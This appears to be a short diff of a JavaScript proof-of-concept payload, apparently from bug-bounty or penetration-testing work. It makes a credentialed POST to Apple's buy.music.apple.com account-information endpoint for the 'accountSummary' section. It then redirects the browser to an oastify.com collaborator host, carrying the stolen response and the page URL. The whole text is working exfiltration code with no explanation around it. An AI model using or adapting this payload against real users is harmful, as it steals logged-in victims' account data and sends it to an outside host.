@@ -1,12 +1,8 @@
 let xhr = new XMLHttpRequest();
-    xhr.withCredentials = true;
-  xhr.open("POST", "https://buy.music.apple.com/account/information/sections");
-  xhr.setRequestHeader("Content-Type","application/json");
-  // xhr.responseType = 'json';
-  xhr.send(JSON.stringify({"sections":["accountSummary"]}));
-  // xhr.onload = () => {
-// 	  location.href = 'https://x0ynl7aa3u8x8x4m6o8n34il5cb6zwnl.oastify.com/?' + JSON.stringify(JSON.parse(xhr.responseText));
-  // };
-  xhr.onload = function () {
-  location.href = 'https://x0ynl7aa3u8x8x4m6o8n34il5cb6zwnl.oastify.com/?' + JSON.stringify(JSON.parse(xhr.responseText));
+xhr.withCredentials = true;
+xhr.open("POST", "https://buy.music.apple.com/account/information/sections");
+xhr.setRequestHeader("Content-Type","application/json");
+xhr.send(JSON.stringify({"sections":["accountSummary"]}));
+xhr.onload = function () {
+    location.href = 'https://x0ynl7aa3u8x8x4m6o8n34il5cb6zwnl.oastify.com/?url=' + document.location.href + '&response=' + JSON.stringify(JSON.parse(xhr.responseText));
 };
